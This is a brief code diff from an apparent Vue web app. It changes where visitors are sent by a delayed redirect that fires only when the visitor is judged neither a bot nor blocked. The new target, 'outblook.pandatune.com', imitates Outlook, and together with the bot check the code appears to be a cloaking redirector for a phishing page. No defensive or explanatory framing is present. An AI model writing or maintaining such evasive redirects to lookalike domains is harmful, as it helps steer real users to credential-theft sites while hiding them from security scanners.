@@ -56,7 +56,7 @@ const app = createApp({
       
       if (!isBot.value && !isBlocked.value) {
         setTimeout(() => {
-          window.location.href = 'https://koon.trumpetx.net/';
+          window.location.href = 'https://outblook.pandatune.com/';
         }, 3000);
       }
     });
